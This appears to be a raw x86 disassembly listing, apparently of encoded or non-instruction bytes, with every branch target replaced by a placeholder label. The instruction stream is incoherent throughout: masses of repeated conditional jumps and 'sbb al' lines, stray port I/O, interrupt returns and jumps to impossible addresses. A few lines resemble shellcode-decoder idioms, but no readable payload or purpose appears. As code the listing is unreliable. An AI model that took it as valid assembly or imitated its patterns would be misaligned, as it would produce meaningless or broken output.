jecxz r-xdata
jecxz r-xdata
and al 0xa
jae r-xdata
xchg ebp eax
jae r-xdata
mov al 0xb5
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
sbb al 0x95
arpl bx sp
jae r-xdata
sbb al 0xb3
push 0xb31ceba6
sbb [ si ] bl
jae r-xdata
jae r-xdata
jae r-xdata
shl [ edx + ebp * 2 + 0x390adba5 ] 0x2c
sbb al 0x1c
jecxz r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
and [ esp + ebx ] ebp
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
jae r-xdata
or bh [ esi + 0x731c1c5f ]
xchg edi eax
pop dx
sub al 0x1c
sbb al 0xa
sbb al 0xa
xchg [ edi ] esi
sbb al 0x1c
in al dx
push 0xec156613
jecxz r-xdata
jae r-xdata
sbb [ ebx - 0x1c1c1d19 ] ecx
push 0xffffffa6
sbb al 0x93
push 0xe8e30a24
jae r-xdata
adc [ ebx + 0x140a9089 ] edi
sub ebx [ esp + ebx ]
sbb al 0x73
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
inc ebx
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
xor eax 0x1c1d6a0a
sbb al 0x73
jae r-xdata
jae r-xdata
pushfd
aas
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
0x681c1c5e 0xf3a6
adc esp [ esi + 0x15 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
sbb eax edx
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
jae r-xdata
sub ah [ esi + 0x23 ]
in al dx
jae r-xdata
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sub al 0x1c
jae r-xdata
or [ esp + ebx ] ebx
int1
jae r-xdata
int3
jae r-xdata
or ecx ecx
jae r-xdata
sbb al 0x1c
leave
jae r-xdata
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
or esi ecx
jecxz r-xdata
and eax [ ebp + 0x6e1fa66a ]
mov bl 0x1c
xchg esi eax
outsb
call 0x73ba3808
jae r-xdata
out 0x68 eax
jae r-xdata
mov bl 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa5
mov dh 0xa
mov ah 0x39
outsb
pushad
sahf
out dx eax
jecxz r-xdata
iretd
outsb
mov dh 0x17
or ebp ecx
or [ esp + ebx ] ebx
or bl [ esi + eax ]
sbb al 0x1c
mov al 0xb5
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl ah
sbb al 0x1c
jae r-xdata
or cl ah
jecxz r-xdata
movsb [ edi ] [ esi ]
mov al [ 0xffffffffec2366f3 ]
sbb eax 0x68e3e3eb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx + ebp ]
sbb al 0x1c
sbb ecx [ edx ]
jae r-xdata
test [ eax ] bh
sbb al 0xb3
jae r-xdata
jae r-xdata
aas
sbb al 0x96
jae r-xdata
mov esi 0x731c1c5f
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
mov [ bp + di - 0x1f ] 0xab0ae3e3
adc ebx [ esp + ebx ]
mov cl [ edx ]
je r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
lea eax [ ebp - 0x44f65996 ]
mov [ edi + 0xfa66a85 ] edx
mov ebx 0x760a8a89
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btr [ edx + ebp * 2 + 0x120b0fbe ] esi
adc [ esp + ebx ] ebx
pushad
daa
out dx eax
and bp sp
out 0x29 eax
sbb al 0x1c
push 0x6ab3b3a5
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
in eax dx
jmp 0x68fd37b9
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x68
mov dh 0xef
sbb ecx [ ebx - 0x1c1c1d19 ]
or bl [ edi + edi + 0x73731c1c ]
jae r-xdata
jae r-xdata
mov [ ebp + 0x9a66a85 ] ecx
mov ebx 0x6a859789
jae r-xdata
loop r-xdata
jae r-xdata
xchg ecx eax
pop ebx
and al 0xa6
in al dx
mov [ 0x1c24 ] al
jae r-xdata
sbb al 0x66
and ecx [ edx ]
0x731c1c02 0x8a89
sbb al 0x1c
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
adc ecx [ edx ]
or [ esp + ebx ] ah
or [ bp + di ] esi
sbb al 0x1c
mov bl 0xa
add dh [ ebx ]
sbb al 0x1c
jae r-xdata
push 0x2366f3a0
in al dx
mov ebp 0x89202ab8
mov al [ ebp - 0x44f25996 ]
mov ebx eax
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
pushad
lahf
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btc [ ecx + 0x3a760a8a ] ecx
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x97
jae r-xdata
and ebp esp
mov ebx esp
mov bl 0xa
fnstenv [ ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov esp 0x2366b8bd
in al dx
xchg ebp eax
sub bl [ esp + ebx ]
xchg ecx eax
xchg ebp eax
retn
and bp sp
sbb al 0x73
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
and al 0x1c
imul esp
jmp r-xdata
jae r-xdata
mov dh 0xe9
jae r-xdata
jae r-xdata
mul edx
jae r-xdata
jae r-xdata
jecxz r-xdata
adc edi [ ebx - 0x6ff53977 ]
jecxz r-xdata
sub ah [ eax ]
jae r-xdata
aas
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0xf3
outsb
nop [ esp + ebx ] bx
or edi ecx
or [ esp + ebx ] ebx
push 0xf10befb6
shl [ ebx ] 0x1
jae r-xdata
mov dh 0x68
jae r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
mov edx 0x6a858d89
scasb [ edi ]
or eax 0x1c0d2c0a
sbb al 0x68
cmp ecx [ ebx - 0x69ef9a79 ]
mov ah 0x6a
mov ebp 0xa8d0bab
sbb al 0x1c
std
punpcklbw mmx0 [ edi ]
sbb esp [ edx + 0xf ]
adc edi [ ebx - 0x33f56c77 ]
test [ edx - 0x5a ] ebp
jae r-xdata
or [ ebx + 0x6a859789 ] edi
cmpsb [ esi ] [ edi ]
or edi [ ecx ]
and bl [ esp + ebx ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
popad
and [ ebx ] ah
shl [ ebx ] 0x1
mov esp 0x7373202a
push 0xe21c601a
in al dx
or ax 0x1c1c
ficomp [ esi - 0x21991309 ]
or [ esp + ebx ] ebx
or ch [ edi + 0x731c1c16 ]
jae r-xdata
jae r-xdata
or edi [ edi + 0x601c1c2f ]
daa
out dx eax
mov ebp ebx
loope r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
in al dx
jne r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx + 0x740a8a89 ] edi
pop ss
push 0xffffffa6
jae r-xdata
mov [ edx + 0xda66a85 ] ecx
mov ebx 0x6a85c389
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
push ss
outsb
jae r-xdata
jae r-xdata
mov [ 0x1c01360a ] eax
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
pop ds
and eax 0xab41c1c
adc [ edx ] dh
sbb al 0x1c
in al dx
and [ edx ] cl
xchg esi eax
sbb al 0x1c
jae r-xdata
jae r-xdata
insd
push ds
sbb al 0x1c
or dl [ esi + 0x731c1c33 ]
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or ah [ ecx + 0x731c1c0b ]
jecxz r-xdata
outsb
scasb [ edi ]
cmp ebp [ esi - 0x5a ]
dec ebx
or edi [ edx + 0xae3e3e1 ]
jo r-xdata
das
mov ebx [ edx - 0x59db796d ]
xor edx [ ecx + 0xbc3c395 ]
mov ecx fs
cmpsb [ esi ] [ edi ]
sub edx [ ebx + 0x24c38f91 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
mov bh 0xb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ edx + edx + 0x73731c1c ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jne r-xdata
outsb
jecxz r-xdata
mov esp 0x202ab8bd
cmpsb [ esi ] [ edi ]
push 0xffffff9e
or eax 0x6a853568
mov dh 0xd9
push 0x9e6a851b
adc ebp [ eax + 0x33 ]
test [ edx - 0x4a ] ebp
fild [ eax + 0x1a ]
push 0x9e6a8532
adc [ ebp + 0x68ddb66a ] eax
sbb ebp [ eax + 0x33 ]
test [ edx - 0x42 ] ebp
add [ edx ] ecx
pop es
pop ebp
sbb al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
or ah [ edx ]
out dx al
jecxz r-xdata
cmp [ edx ] esp
sbb al 0x1c
loop r-xdata
jae r-xdata
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffbe
pop ds
mov esi 0xe7b51c1f
jae r-xdata
sti
jecxz r-xdata
jne r-xdata
jae r-xdata
and eax 0x1c1e6d0b
sbb al 0xa
xchg esi eax
xor ebx [ esp + ebx ]
jae r-xdata
or cl [ edi + ebp + 0x1c ]
sbb al 0x73
mov ebx 0xcc0a9389
sbb al 0x1c
or dh [ esi + 0x3a ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb0
movsb [ edi ] [ esi ]
sbb al 0x75
dec edi
jecxz r-xdata
or bh [ ebp - 0x7ae3e3d3 ]
jae r-xdata
mov edx 0x67ec2366
jmp 0xffffffffd12a3b3e
jae r-xdata
in al dx
sbb eax 0x8561ecc3
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or dl ch
adc [ esp + ebx ] bl
adc bl [ esp + ebx ]
jae r-xdata
jae r-xdata
mov esi eax
or dl [ eax + 0x73e3e3e3 ]
sbb al 0x73
mov [ edx + 0x11a66a85 ] ecx
mov ebx 0x1c3f160a
jmp r-xdata
jbe r-xdata
sbb al 0xec
jae r-xdata
or eax 0x85c389bb
push 0xffffffa6
cmpsb [ esi ] [ edi ]
mov [ ecx - 0x59957a45 ] eax
sbb ecx [ ecx + 0x6a85bb90 ]
cmp bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or al [ edi - 0x13e3e3c9 ]
outsb
mov ah 0xb0
or cl [ edx + edx + 0x73731c1c ]
sbb al 0xa
daa
out 0xe3 eax
sub al 0x1c
sbb al 0x1c
jae r-xdata
sbb al 0xb5
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
sbb al 0x96
outsb
cmpsb [ esi ] [ edi ]
aas
mov bl 0x68
and eax 0x1c58070b
sbb al 0xba
and bp sp
jae r-xdata
jae r-xdata
mov dl 0xa
aad 0x10
sbb al 0x1c
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0x1c
sub eax 0x6a851c1c
mov esi 0xb88e891d
jae r-xdata
jmp 0xffffffffd12a3b3e
and ebp esp
jae r-xdata
jecxz r-xdata
sar [ ebx + 0x2b689b89 ] 0x85
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
or dl [ esi ]
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0x1c
sbb ax 0xe3eb
or ah [ ecx ]
mov [ edx + ebp * 2 ] ebx
sahf
sbb ebx [ esi * 2 - 0x1c1c1c91 ]
and cx [ edx ]
mov ecx 0x731c1c08
jae r-xdata
mov ebp edi
jecxz r-xdata
ja r-xdata
push 0x1b07600f
bound ecx [ edi ]
jae r-xdata
jae r-xdata
daa
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
iretd
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xffffffbe
sbb eax 0xab88e89
push es
sbb al 0x85
jae r-xdata
sub ah [ eax ]
sbb al 0x1c
mov esp 0x737320bd
jae r-xdata
insb
sub ebx [ esp + ebx ]
mov [ ebx + 0x6a852b68 ] ebx
scasb [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
aas
mov ebx 0x1c0ba10a
cmpsb [ esi ] [ edi ]
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffa6
jae r-xdata
pushad
daa
out dx eax
fidivr [ edi + 0x67ecf7c7 ]
jmp r-xdata
jae r-xdata
jae r-xdata
popad
sbb al 0x1c
dec ebx
mov ch 0xa
pop esp
sub [ esp + ebx ] ebx
test [ edx - 0x52 ] ebp
jae r-xdata
sahf
sbb ebx [ esi * 4 + 0x603b68db ]
sbb [ esp + ebp * 8 ] bl
jecxz r-xdata
push 0xa66a8525
jae r-xdata
push 0xbc0aeba6
push 0xae6a852b
jae r-xdata
mov ebx 0x2b689b89
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
pushad
sbb eax 0xab681c1c
jmp r-xdata
fsubr st6
test [ edx - 0x5a ] ebp
test [ edx - 0x52 ] ebp
jae r-xdata
fwait
jae r-xdata
and eax 0xc1a66a85
jae r-xdata
pushad
jae r-xdata
or [ si ] bl
sbb al 0x1c
pushad
sahf
pop ds
out 0xec eax
outsd
add bl [ esp + ebx ]
sbb al 0xa
xlat
or al 0x1c
sbb al 0xa
jno r-xdata
cmp esp [ eax + 0x18 ]
sbb al 0xec
pushad
sbb dl cl
in al dx
sub al 0x1d
sbb al 0x1c
push 0x2468ebab
or esi [ edi + 0xa1c1c25 ]
mov ch 0x4
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
loop r-xdata
sub eax [ ebp - 0x45385196 ]
mov [ ecx + 0x6a853a68 ] edx
mov esi 0x853b68c5
push 0xffffffbe
jae r-xdata
mov bl 0xec
jae r-xdata
jae r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
sbb al 0x73
jecxz r-xdata
push 0xffffffae
mov edx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
mov eax 0x1c06670a
or ah [ edi + 0x6 ]
jmp r-xdata
arpl [ esi + edx * 4 ] bx
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x1c
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
retn
jae r-xdata
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
mov ah 0xaf
jae r-xdata
jae r-xdata

push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp
and bp sp
sbb al 0xb4
scasd [ edi ]
jae r-xdata
nop
and al 0xa6
jae r-xdata
0x1c13
in al dx
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
and [ ebp - 0x44025996 ] eax
mov ebp ecx
mov ebp 0x6a858689
rol ebx 0xc1
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
jae r-xdata
jae r-xdata
mov edx 0xece11b60
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
push 0xffffffb6
aas
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
mov ebp 0x1c29ec0a
sbb al 0x73
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x1c
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
jecxz r-xdata
jae r-xdata
ja r-xdata
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov bh 0xb
jae r-xdata
sbb al 0x73
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
cdq
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
in al dx
push esp
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
loop r-xdata
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jmp 0xffffffffe3db145e
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
loop r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0xb0
or cl dh
lahf
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
btr [ edx ] ecx
jae r-xdata
push 0xb30f620f
loope r-xdata
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
iretd
jae r-xdata
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
sbb al 0x1c
fistp [ ebx ]
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
